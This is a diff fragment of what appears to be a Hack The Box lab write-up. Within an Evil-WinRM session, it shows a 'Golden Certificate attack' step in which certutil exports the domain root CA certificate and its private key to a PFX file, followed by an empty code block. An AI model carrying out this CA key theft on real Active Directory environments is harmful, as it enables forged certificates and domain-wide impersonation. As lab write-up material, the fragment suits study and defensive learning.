@@ -811,22 +811,34 @@ I tried the next steps in the article but they all failed
 # Golden Certificate attack
 
 ```python
-*Evil-WinRM* PS C:\Users\ryan.k\Desktop> certutil -store
-
-================ Certificate 4 ================
-Serial Number: 75b2f4bbf31f108945147b466131bdca
+*Evil-WinRM* PS C:\Users\ryan.k\Desktop> certutil -exportPFX MY 344cb419d59054904031b340f5a43923 .\GT.pfx
+MY "Personal"
+================ Certificate 0 ================
+Serial Number: 344cb419d59054904031b340f5a43923
 Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
- NotBefore: 11/3/2024 2:55 PM
- NotAfter: 11/3/2034 3:05 PM
+ NotBefore: 3/12/2026 12:45 PM
+ NotAfter: 3/12/2126 12:55 PM
 Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 Certificate Template Name (Certificate Type): CA
-CA Version: V0.0
+CA Version: V1.1
 Signature matches Public Key
 Root Certificate: Subject matches Issuer
 Template: CA, Root Certification Authority
-Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
-No key provider information
-Missing stored keyset
+Cert Hash(sha1): db462c9739270d510c43610eaddb80c07c395232
+  Key Container = Certificate-LTD-CA(1)
+  Unique container name: 90afd1db88a1213f39411d248394d83d_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+Enter new password for output file .\GT.pfx:
+Enter new password:
+Confirm new password:
+CertUtil: -exportPFX command completed successfully.
+```
+
+Ill use the serial found in the certipy find command above
+
+```python
+
 ```
 
 
